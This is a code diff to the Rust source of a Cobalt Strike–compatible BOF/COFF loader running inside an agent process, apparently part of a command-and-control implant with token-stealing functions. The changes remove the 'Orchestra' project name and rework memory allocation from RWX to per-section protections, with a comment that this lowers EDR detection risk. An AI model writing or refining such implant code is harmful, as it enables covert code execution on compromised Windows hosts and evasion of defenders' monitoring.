@@ -1,4 +1,4 @@
-//! BOF (Beacon Object File) / COFF loader for Orchestra.
+//! BOF (Beacon Object File) / COFF loader.
 //!
 //! Executes small position-independent C/Rust object files inside the agent
 //! process — the equivalent of Cobalt Strike's BOF capability.  Compatible
@@ -9,8 +9,10 @@
 //!
 //! 1. **COFF parser** — parses the COFF header, sections, symbol table, and
 //!    string table from raw `.o` / `.obj` bytes.
-//! 2. **Loader** — allocates RWX memory, maps sections, applies relocations,
-//!    resolves external symbols, and sets final section protections.
+//! 2. **Loader** — allocates RW memory, maps sections, applies relocations,
+//!    resolves external symbols, and sets per-section protections (RX for .text,
+//!    RW for .data, RO for .rdata).  The entire BOF region is never RWX — only
+//!    individual sections that request both execute+write get RWX.
 //! 3. **Symbol resolver** — provides Beacon-compatible API functions
 //!    (`BeaconPrintf`, `BeaconDataParse`, etc.) and resolves `DLL$Function`
 //!    patterns dynamically via `LoadLibraryA` + `GetProcAddress`.
@@ -47,7 +49,7 @@ use winapi::shared::winerror::S_OK;
 // CreateEventW removed — was unused
 use winapi::um::winbase::WAIT_OBJECT_0;
 use winapi::um::winnt::{
-    MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
+    MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READONLY,
     PAGE_READWRITE, PVOID,
 };
 
@@ -366,16 +368,16 @@ unsafe extern "C" fn beacon_output(_typ: i32, data: *mut u8, len: i32) {
     append_output(slice);
 }
 
-/// `BeaconUseToken(token_handle)` — delegate to Orchestra's token manipulation.
+/// `BeaconUseToken(token_handle)` — delegate to token manipulation.
 unsafe extern "C" fn beacon_use_token(_token: *mut c_void) -> i32 {
-    // Orchestra's token manipulation uses username/password/steal-token, not
+    // Token manipulation uses username/password/steal-token, not
     // raw handles.  Return 0 (success) as a no-op stub.  Full implementation
     // would call super::token_manipulation APIs.
     log::warn!("[coff_loader] BeaconUseToken called — stub, no-op");
     0
 }
 
-/// `BeaconRevertToken()` — delegate to Orchestra's rev2self.
+/// `BeaconRevertToken()` — delegate to rev2self.
 unsafe extern "C" fn beacon_revert_token() -> i32 {
     match crate::token_manipulation::rev2self() {
         Ok(_) => 0,
@@ -438,7 +440,7 @@ unsafe extern "C" fn beacon_cleanup_process(_hproc: *mut c_void) {
 
 /// `toNative(order, value)` — byte-swap if needed.  On x86/x64, native is LE.
 unsafe extern "C" fn to_native(_order: i32, value: u32) -> u32 {
-    // Orchestra runs on x86/x64 which is little-endian.  BOF data is also LE.
+    // The agent runs on x86/x64 which is little-endian.  BOF data is also LE.
     // No conversion needed.
     value
 }
@@ -925,7 +927,7 @@ pub unsafe fn execute_bof(
         0u64,                                 // ZeroBits
         &mut region_size as *mut _ as u64,  // RegionSize (in/out)
         (MEM_COMMIT | MEM_RESERVE) as u64,  // AllocationType
-        PAGE_EXECUTE_READWRITE as u64,       // Protect
+        PAGE_READWRITE as u64,              // PAGE_READWRITE — flipped to per-section protections after relocations
     );
     if alloc_status.is_err() || alloc_status.unwrap() < 0 || base_ptr == 0 {
         return Err("NtAllocateVirtualMemory failed for COFF memory".to_string());
@@ -1105,12 +1107,21 @@ pub unsafe fn execute_bof(
             continue;
         }
 
-        let prot = if section.characteristics & IMAGE_SCN_MEM_EXECUTE != 0 {
-            PAGE_EXECUTE_READ
-        } else if section.characteristics & IMAGE_SCN_MEM_WRITE != 0 {
-            PAGE_READWRITE
-        } else {
-            PAGE_READWRITE
+        // Map COFF section characteristics to Windows page protections.
+        // The initial allocation was PAGE_READWRITE; now that relocations
+        // are applied we set the correct per-section protection.
+        //
+        // Note: sections with both EXECUTE+WRITE require PAGE_EXECUTE_READWRITE.
+        // This is rare in well-formed BOFs but some JIT-style or self-modifying
+        // code sections request it.  The EDR risk is per-section, not the
+        // entire BOF allocation (which would be far louder).
+        let is_executable = section.characteristics & IMAGE_SCN_MEM_EXECUTE != 0;
+        let is_writable = section.characteristics & IMAGE_SCN_MEM_WRITE != 0;
+        let prot = match (is_executable, is_writable) {
+            (true,  false) => PAGE_EXECUTE_READ,     // RX — most .text sections
+            (true,  true)  => 0x40u32,               // RWX — unavoidable for RW+RX sections
+            (false, true)  => PAGE_READWRITE,         // RW — .data/.bss sections
+            (false, false) => PAGE_READONLY,                // RO — .rdata sections
         };
 
         let mut base_addr = (base as usize + offset) as *mut c_void;
